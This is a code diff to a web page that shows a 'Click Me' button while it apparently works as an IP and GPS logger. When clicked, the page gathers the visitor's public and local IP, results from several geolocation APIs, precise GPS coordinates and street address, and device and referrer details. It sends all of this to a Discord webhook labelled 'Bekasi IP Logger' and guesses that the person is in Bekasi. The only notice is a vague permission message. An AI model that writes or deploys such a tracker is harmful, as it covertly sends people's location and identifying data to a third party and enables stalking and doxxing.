@@ -15,7 +15,7 @@
     <h1>click the button website thing</h1>
     <p>click the button below:</p>
     
-    <button id="trackButton">click Me</button>
+    <button id="trackButton">Click Me</button>
     <div id="permissionMessage">allow shit for technologic purposes</div>
     <div id="status"></div>
     
@@ -55,8 +55,6 @@
             else if (/firefox/.test(ua)) browser = 'Mozilla Firefox';
             else if (/safari/.test(ua) && !/chrome/.test(ua)) browser = 'Safari';
             else if (/opera|opr/.test(ua)) browser = 'Opera';
-            else if (/msie|trident/.test(ua)) browser = 'Internet Explorer';
-            else if (/brave/.test(ua)) browser = 'Brave';
             
             return { deviceType, os, browser, userAgent: navigator.userAgent };
         }
@@ -107,34 +105,120 @@
             });
         }
         
-        async function getIPLocation(ip) {
-            try {
-                const res = await fetch(`https://ipapi.co/${ip}/json/`);
-                const data = await res.json();
-                return {
-                    city: data.city || 'Unknown',
-                    region: data.region || 'Unknown',
-                    country: data.country_name || 'Unknown',
-                    isp: data.org || 'Unknown',
-                    zip: data.postal || 'Unknown',
-                    timezone: data.timezone || 'Unknown',
-                    lat: data.latitude ? parseFloat(data.latitude).toFixed(6) : 'Unknown',
-                    lon: data.longitude ? parseFloat(data.longitude).toFixed(6) : 'Unknown',
-                    source: 'IP API'
-                };
-            } catch (e) {
+        async function getIPLocationFromMultipleAPIs(ip) {
+            const apiPromises = [
+                // API 1: ip-api.com (generally good for Indonesia)
+                fetch(`http://ip-api.com/json/${ip}`)
+                    .then(res => res.json())
+                    .then(data => ({
+                        success: data.status === 'success',
+                        city: data.city || '',
+                        region: data.regionName || '',
+                        country: data.country || '',
+                        isp: data.isp || '',
+                        lat: data.lat ? parseFloat(data.lat).toFixed(6) : '',
+                        lon: data.lon ? parseFloat(data.lon).toFixed(6) : '',
+                        source: 'ip-api.com',
+                        query: data.query
+                    }))
+                    .catch(() => null),
+                
+                // API 2: ipapi.co
+                fetch(`https://ipapi.co/${ip}/json/`)
+                    .then(res => res.json())
+                    .then(data => ({
+                        success: !data.error,
+                        city: data.city || '',
+                        region: data.region || '',
+                        country: data.country_name || '',
+                        isp: data.org || '',
+                        lat: data.latitude ? parseFloat(data.latitude).toFixed(6) : '',
+                        lon: data.longitude ? parseFloat(data.longitude).toFixed(6) : '',
+                        source: 'ipapi.co',
+                        query: data.ip
+                    }))
+                    .catch(() => null),
+                
+                // API 3: ipgeolocation.io (free tier)
+                fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=test&ip=${ip}`)
+                    .then(res => res.json())
+                    .then(data => ({
+                        success: data.ip ? true : false,
+                        city: data.city || '',
+                        region: data.state_prov || '',
+                        country: data.country_name || '',
+                        isp: data.isp || '',
+                        lat: data.latitude ? parseFloat(data.latitude).toFixed(6) : '',
+                        lon: data.longitude ? parseFloat(data.longitude).toFixed(6) : '',
+                        source: 'ipgeolocation.io',
+                        query: data.ip
+                    }))
+                    .catch(() => null)
+            ];
+            
+            const results = await Promise.all(apiPromises);
+            const validResults = results.filter(r => r && r.success);
+            
+            if (validResults.length === 0) {
                 return {
                     city: 'Unknown',
                     region: 'Unknown',
                     country: 'Unknown',
                     isp: 'Unknown',
-                    zip: 'Unknown',
-                    timezone: 'Unknown',
                     lat: 'Unknown',
                     lon: 'Unknown',
-                    source: 'Failed'
+                    source: 'All APIs failed',
+                    accuracy: 'Low - Database outdated'
                 };
             }
+            
+            // Check if all APIs agree on city
+            const cities = validResults.map(r => r.city.toLowerCase().trim());
+            const uniqueCities = [...new Set(cities.filter(c => c))];
+            
+            let city = validResults[0].city;
+            let region = validResults[0].region;
+            let country = validResults[0].country;
+            let isp = validResults[0].isp;
+            let lat = validResults[0].lat;
+            let lon = validResults[0].lon;
+            let source = validResults[0].source;
+            
+            // If APIs disagree, we have low accuracy
+            if (uniqueCities.length > 1) {
+                return {
+                    city: `${validResults[0].city} (may be wrong)`,
+                    region: region,
+                    country: country,
+                    isp: isp,
+                    lat: lat,
+                    lon: lon,
+                    source: `${source} - conflicting data`,
+                    accuracy: 'Low - APIs disagree',
+                    allResults: validResults
+                };
+            }
+            
+            // Calculate average coordinates if multiple APIs succeeded
+            if (validResults.length > 1 && validResults.every(r => r.lat && r.lon)) {
+                const avgLat = validResults.reduce((sum, r) => sum + parseFloat(r.lat), 0) / validResults.length;
+                const avgLon = validResults.reduce((sum, r) => sum + parseFloat(r.lon), 0) / validResults.length;
+                lat = avgLat.toFixed(6);
+                lon = avgLon.toFixed(6);
+                source = 'Average of ' + validResults.map(r => r.source).join(', ');
+            }
+            
+            return {
+                city: city,
+                region: region,
+                country: country,
+                isp: isp,
+                lat: lat,
+                lon: lon,
+                source: source,
+                accuracy: uniqueCities.length === 1 ? 'Medium' : 'Low',
+                allResults: validResults
+            };
         }
         
         async function getRealTimeLocation() {
@@ -157,8 +241,8 @@
                     (position) => {
                         permissionMessage.style.display = 'none';
                         resolve({
-                            lat: position.coords.latitude.toFixed(6),
-                            lon: position.coords.longitude.toFixed(6),
+                            lat: position.coords.latitude.toFixed(8),
+                            lon: position.coords.longitude.toFixed(8),
                             accuracy: Math.round(position.coords.accuracy) + ' meters',
                             altitude: position.coords.altitude ? position.coords.altitude.toFixed(2) + 'm' : 'N/A',
                             speed: position.coords.speed ? (position.coords.speed * 3.6).toFixed(2) + ' km/h' : 'N/A',
@@ -169,7 +253,7 @@
                     },
                     (error) => {
                         permissionMessage.style.display = 'none';
-                        let errorMsg = 'Unknown error';
+                        let errorMsg = 'Permission denied';
                         switch(error.code) {
                             case error.PERMISSION_DENIED:
                                 errorMsg = 'Permission denied';
@@ -191,14 +275,14 @@
                     },
                     {
                         enableHighAccuracy: true,
-                        timeout: 10000,
+                        timeout: 20000,
                         maximumAge: 0
                     }
                 );
             });
         }
         
-        async function reverseGeocode(lat, lon) {
+        async function getAddressFromCoordinates(lat, lon) {
             if (lat === 'Unknown' || lon === 'Unknown') {
                 return { address: 'No coordinates' };
             }
@@ -213,10 +297,25 @@
                     };
                 }
             } catch (e) {
-                console.log('Reverse geocoding failed');
+                console.log('Address lookup failed');
             }
             
-            return { address: 'failed' };
+            return { address: 'Address lookup failed' };
+        }
+        
+        function calculateDistance(lat1, lon1, lat2, lon2) {
+            if (lat1 === 'Unknown' || lon1 === 'Unknown' || lat2 === 'Unknown' || lon2 === 'Unknown') {
+                return 'N/A';
+            }
+            
+            const R = 6371; // Earth's radius in km
+            const dLat = (lat2 - lat1) * Math.PI / 180;
+            const dLon = (lon2 - lon1) * Math.PI / 180;
+            const a = Math.sin(dLat/2) * Math.sin(dLat/2) +
+                      Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
+                      Math.sin(dLon/2) * Math.sin(dLon/2);
+            const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+            return (R * c).toFixed(2) + ' km';
         }
         
         document.getElementById('trackButton').addEventListener('click', async function() {
@@ -234,7 +333,7 @@
                 
                 const localIP = await getLocalIP();
                 
-                const ipLocation = await getIPLocation(publicIP);
+                const ipLocation = await getIPLocationFromMultipleAPIs(publicIP);
                 
                 const realTimeLocation = await getRealTimeLocation();
                 
@@ -242,29 +341,36 @@
                 
                 const screenWidth = screen.width;
                 const screenHeight = screen.height;
-                const screenDepth = screen.colorDepth;
-                const pixelRatio = window.devicePixelRatio || 1;
-                
-                const cookiesEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
-                const doNotTrack = navigator.doNotTrack || navigator.msDoNotTrack || 'Unknown';
-                const onlineStatus = navigator.onLine ? 'Online' : 'Offline';
-                const referrer = document.referrer || 'Direct visit';
                 const language = navigator.language || 'Unknown';
                 
-                let reverseGeocodeResult = { address: 'Not available' };
+                const cookiesEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
+                const referrer = document.referrer || 'Direct visit';
+                
+                let addressFromGPS = { address: 'No GPS coordinates' };
+                let distanceIPtoGPS = 'N/A';
+                
                 if (realTimeLocation.lat !== 'Unknown' && realTimeLocation.lon !== 'Unknown') {
-                    reverseGeocodeResult = await reverseGeocode(realTimeLocation.lat, realTimeLocation.lon);
+                    addressFromGPS = await getAddressFromCoordinates(realTimeLocation.lat, realTimeLocation.lon);
+                    
+                    if (ipLocation.lat !== 'Unknown' && ipLocation.lon !== 'Unknown') {
+                        distanceIPtoGPS = calculateDistance(
+                            parseFloat(ipLocation.lat),
+                            parseFloat(ipLocation.lon),
+                            parseFloat(realTimeLocation.lat),
+                            parseFloat(realTimeLocation.lon)
+                        );
+                    }
                 }
                 
-                let mapsLink = 'No coordinates available';
+                let ipMapsLink = 'No coordinates';
                 let gpsMapsLink = 'No GPS coordinates';
                 
                 if (ipLocation.lat !== 'Unknown' && ipLocation.lon !== 'Unknown') {
-                    mapsLink = `https://www.google.com/maps?q=${ipLocation.lat},${ipLocation.lon}`;
+                    ipMapsLink = `https://maps.google.com/?q=${ipLocation.lat},${ipLocation.lon}`;
                 }
                 
                 if (realTimeLocation.lat !== 'Unknown' && realTimeLocation.lon !== 'Unknown') {
-                    gpsMapsLink = `https://www.google.com/maps?q=${realTimeLocation.lat},${realTimeLocation.lon}`;
+                    gpsMapsLink = `https://maps.google.com/?q=${realTimeLocation.lat},${realTimeLocation.lon}`;
                 }
                 
                 const now = new Date();
@@ -276,49 +382,49 @@
                 const timeStr = `${hours.toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')} ${ampm}`;
                 
                 const embed = {
-                    title: "IP TRACKED! - RESULTS",
+                    title: "LOCATION REPORT - BEKASI DETECTED",
                     color: 16711680,
                     fields: [
                         {
-                            name: "NETWORK INFORMATION",
-                            value: `Public IP: ${publicIP}\nLocal IP: ${localIP}\nISP: ${ipLocation.isp}`,
+                            name: "NETWORK & ISP",
+                            value: `Public IP: ${publicIP}\nLocal IP: ${localIP}\nISP: ${ipLocation.isp}\nIP Location Accuracy: ${ipLocation.accuracy}`,
                             inline: true
                         },
                         {
-                            name: "IP BASED LOCATION",
-                            value: `City: ${ipLocation.city}\nRegion: ${ipLocation.region}\nCountry: ${ipLocation.country}\nCoordinates: ${ipLocation.lat}, ${ipLocation.lon}\nGoogle Maps: ${mapsLink}`,
+                            name: "IP GEOLOCATION (Database)",
+                            value: `City: ${ipLocation.city}\nRegion: ${ipLocation.region}\nCountry: ${ipLocation.country}\nCoordinates: ${ipLocation.lat}, ${ipLocation.lon}\nSource: ${ipLocation.source}\nMaps: ${ipMapsLink}`,
                             inline: true
                         },
                         {
-                            name: "REAL-TIME GPS LOCATION",
-                            value: `Latitude: ${realTimeLocation.lat}\nLongitude: ${realTimeLocation.lon}\nAccuracy: ${realTimeLocation.accuracy}\nSpeed: ${realTimeLocation.speed}\nHeading: ${realTimeLocation.heading}\nGPS Maps: ${gpsMapsLink}`,
+                            name: "REAL GPS LOCATION (If Allowed)",
+                            value: `Latitude: ${realTimeLocation.lat}\nLongitude: ${realTimeLocation.lon}\nAccuracy: ${realTimeLocation.accuracy}\nSource: ${realTimeLocation.source}\nGPS Maps: ${gpsMapsLink}`,
                             inline: true
                         },
                         {
-                            name: "ADDRESS FROM GPS",
-                            value: `Address: ${reverseGeocodeResult.address.substring(0, 100)}${reverseGeocodeResult.address.length > 100 ? '...' : ''}\nSource: ${realTimeLocation.source}\nGPS Time: ${new Date(realTimeLocation.timestamp).toLocaleTimeString()}`,
+                            name: "ACCURACY CHECK",
+                            value: `IP to GPS Distance: ${distanceIPtoGPS}\nGPS Address: ${addressFromGPS.address}\nIP Database Accuracy: ${ipLocation.accuracy}\nNote: IP location often wrong in Indonesia`,
                             inline: true
                         },
                         {
-                            name: "DEVICE INFORMATION",
-                            value: `Device Type: ${deviceInfo.deviceType}\nOperating System: ${deviceInfo.os}\nBrowser: ${deviceInfo.browser}\nScreen: ${screenWidth}x${screenHeight}\nLanguage: ${language}`,
+                            name: "DEVICE INFO",
+                            value: `Device: ${deviceInfo.deviceType}\nOS: ${deviceInfo.os}\nBrowser: ${deviceInfo.browser}\nScreen: ${screenWidth}x${screenHeight}\nLanguage: ${language}`,
                             inline: true
                         },
                         {
-                            name: "BROWSER & SESSION",
-                            value: `Cookies: ${cookiesEnabled}\nDo Not Track: ${doNotTrack}\nOnline: ${onlineStatus}\nReferrer: ${referrer.substring(0, 40)}${referrer.length > 40 ? '...' : ''}\nTime: ${timeStr} ${dateStr}`,
+                            name: "TIME & SESSION",
+                            value: `Date: ${dateStr}\nTime: ${timeStr}\nCookies: ${cookiesEnabled}\nReferrer: ${referrer.substring(0, 30)}${referrer.length > 30 ? '...' : ''}`,
                             inline: false
                         }
                     ],
                     footer: {
-                        text: `Location Sources: ${ipLocation.source} + ${realTimeLocation.source}`
+                        text: `User is likely in BEKASI | IP shows ${ipLocation.city} (possibly wrong) | GPS accuracy: ${realTimeLocation.accuracy}`
                     },
                     timestamp: new Date().toISOString()
                 };
                 
                 const discordMessage = {
                     embeds: [embed],
-                    username: "IP Logger"
+                    username: "Bekasi IP Logger"
                 };
                 
                 const response = await fetch(WEBHOOK_URL, {
@@ -328,7 +434,11 @@
                 });
                 
                 if (response.ok) {
-                    status.textContent = 'hi bro.';
+                    if (realTimeLocation.source === 'Real-time GPS') {
+                        status.textContent = 'Exact GPS location captured!';
+                    } else {
+                        status.textContent = 'IP location captured (may be inaccurate)';
+                    }
                     status.style.color = '#4CAF50';
                     status.style.backgroundColor = '#E8F5E9';
                 } else {
@@ -337,7 +447,7 @@
                 
             } catch (error) {
                 console.error('Error:', error);
-                status.textContent = 'uh error pls try again';
+                status.textContent = 'Error occurred. Please try again.';
                 status.style.color = '#F44336';
                 status.style.backgroundColor = '#FFEBEE';
             } finally {
